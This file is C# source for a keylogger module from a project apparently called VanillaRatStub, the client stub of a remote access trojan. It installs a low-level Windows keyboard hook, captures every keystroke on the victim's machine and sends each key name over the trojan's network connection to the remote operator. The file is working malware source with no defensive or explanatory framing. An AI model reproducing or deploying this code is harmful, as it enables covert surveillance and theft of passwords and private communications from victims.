using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VanillaRatStub.InformationHelpers
{
    public class Keylogger
    {
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        public static LowLevelKeyboardProc Proc = HookCallback;
        public static IntPtr HookID = IntPtr.Zero;
        public static bool SendKeys { get; set; }

        public void InitKeylogger()
        {
            try
            {
                ApplicationContext MessageLoop = new ApplicationContext();
                HookID = SetHook(Proc);
                Application.Run(MessageLoop);
                UnhookWindowsHookEx(HookID);
            }
            catch
            {
                return;
            }
        }

        public IntPtr SetHook(LowLevelKeyboardProc Proc)
        {
            using (Process CurrentProcess = Process.GetCurrentProcess())
            using (ProcessModule CurrentModule = CurrentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, Proc, GetModuleHandle(CurrentModule.ModuleName), 0);
            }
        }
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (SendKeys)
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(11); //Keystroke
                    ToSend.AddRange(Encoding.ASCII.GetBytes(((Keys)vkCode).ToString()));
                    Networking.MainClient.Send(ToSend.ToArray());
                }        
            }
            return CallNextHookEx(HookID, nCode, wParam, lParam);
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
